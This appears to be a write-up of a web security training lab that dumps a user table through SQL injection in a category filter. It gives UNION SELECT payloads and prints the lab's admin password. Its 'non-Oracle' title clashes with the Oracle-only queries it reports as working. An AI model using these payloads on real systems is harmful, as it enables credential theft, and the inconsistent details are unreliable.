# Lab: SQL injection attack, listing the database contents on non-Oracle databases

**End Goal:** Log in as the ```administrator``` user.


**Analysis**

*The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.*

*The SQL injection vulnerability is in the product category filter so let's add ' after the category to see if the page breaks*

https://0aa800070406644081b4b143006600ad.web-security-academy.net/filter?category=Accessories%27

*The page broke. So the injection works. Now check how many columns are there.*

' ORDER BY 1-- -

*No error*

' ORDER BY 2-- -

*No error*

' ORDER BY 3-- -

*Error detected so there are only 2 columns. The cheat sheet has this for Oracle databases: You can list the tables that exist in the database, and the columns that those tables contain.*

SELECT * FROM all_tables

*all_tables has all the tables and column table_name stores all the names of the tables*

' UNION SELECT table_name, NULL FROM all_tables--

*It shows a list of table names. ctrl+f users. Saw this:*

USERS_EXTJPN

*Check the cheat sheet and find the column names in this table now*

' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name= 'USERS_EXTJPN' --

*This returned the following columns:*

EMAIL
PASSWORD_HLMBKG
USERNAME_SQWXKY

*I used these to get the admin credentials:*

' UNION SELECT USERNAME_SQWXKY, PASSWORD_HLMBKG FROM USERS_EXTJPN--

**Answer:** 

administrator
2su3fvyoqrp5cwzn2zjn

